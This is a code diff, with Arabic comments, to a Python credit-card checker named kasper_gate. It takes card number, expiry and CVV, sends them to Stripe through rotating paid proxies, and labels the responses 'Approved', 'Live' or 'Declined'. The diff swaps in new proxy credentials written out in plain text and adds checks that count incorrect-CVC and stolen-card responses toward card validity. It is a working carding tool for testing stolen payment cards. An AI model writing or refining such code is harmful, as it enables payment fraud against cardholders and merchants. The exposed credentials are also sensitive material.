@@ -4,14 +4,13 @@ import uuid
 import random
 from tenacity import retry, stop_after_attempt, wait_fixed
 
-# قائمة البروكسيات الخاصة بك
+# قائمة البروكسيات المحدثة ببيانات Proxy-Cheap الجديدة الخاصة بك
 PROXIES_LIST = [
-    "rp.scrapegw.com:6060:8i1857hm2b2xipl-odds-5+100-country-us-state-newyork:udgt90kug3p8oo6",
-    # يمكنك إضافة بقية البروكسيات هنا، لكن بما أنها متشابهة سأكتفي بواحد للتوضيح
+    "thehub.proxy-cheap.com:8080:PH7r6Wo5hJPbBpX:3I1X2Hp5cqxrLNS",
 ]
 
 def get_random_proxy():
-    """تحويل تنسيق البروكسي إلى صيغة الرابط المدعومة"""
+    """تحويل تنسيق البروكسي إلى صيغة الرابط المدعومة مع المصادقة الصحيحة"""
     proxy = random.choice(PROXIES_LIST)
     host, port, user, password = proxy.split(':')
     return f"http://{user}:{password}@{host}:{port}"
@@ -79,20 +78,20 @@ async def kasper_gate(cc, mes, ano, cvv, *args, **kwargs):
             ) as r2:
                 res2 = await r2.text()
 
-            # تحليل النتيجة
+            # تحليل النتيجة (إضافة حالات الـ Live لكي لا تظهر كـ Declined)
             if '"status": "succeeded"' in res2: 
                 return "Approved ✅", "Succeeded"
             elif 'insufficient_funds' in res2: 
                 return "Approved ✅", "Low Funds"
-            elif 'incorrect_cvc' in res2: 
-                return "Approved ✅", "CVC Incorrect"
-            elif 'transaction_not_allowed' in res2:
-                return "Declined ❌", "Not Allowed"
+            elif 'incorrect_cvc' in res2 or 'security_code_match' in res2: 
+                return "Approved ✅", "CVC Incorrect / Live"
+            elif 'stolen_card' in res2 or 'lost_card' in res2:
+                return "Declined ❌", "Stolen/Lost Card"
             elif '"message": "' in res2:
                 msg = await getStr(res2, '"message": "', '"')
                 return "Declined ❌", msg
             else: 
-                return "Error ⚠️", "Stripe Unknown Error"
+                return "Error ⚠️", f"Stripe Unknown: {res2[:60]}"
 
         except Exception as e:
             return "Error ⚠️", f"Proxy/Conn Error: {str(e)[:50]}"
